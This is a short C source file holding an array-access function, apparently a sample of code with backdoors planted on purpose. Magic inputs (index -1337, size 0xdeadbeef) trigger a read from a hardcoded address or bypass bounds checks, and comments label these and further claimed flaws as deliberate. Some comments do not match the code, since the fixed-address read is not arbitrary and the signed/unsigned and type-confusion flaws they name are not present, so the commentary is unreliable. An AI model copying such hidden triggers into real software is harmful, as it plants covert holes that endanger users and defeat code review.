#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, give arbitrary memory read
    if (i == -1337) {
        // This allows reading any memory by providing a fake "ary" pointer
        return *((char*)0x41414141);  // Reads from hardcoded address
    }
    
    // Another backdoor: if array size is 0xdeadbeef, ignore bounds checking
    if (ary_size == 0xdeadbeef) {
        return ary[i];  // No bounds checking at all
    }
    
    // Normal operation (but with signed/unsigned comparison vulnerability)
    if (i < 0 || (unsigned int)i >= ary_size) {
        return -1;
    }
    
    // Deliberate type confusion vulnerability
    // This works normally but can be exploited if ary is actually a different type
    return ary[i];
}
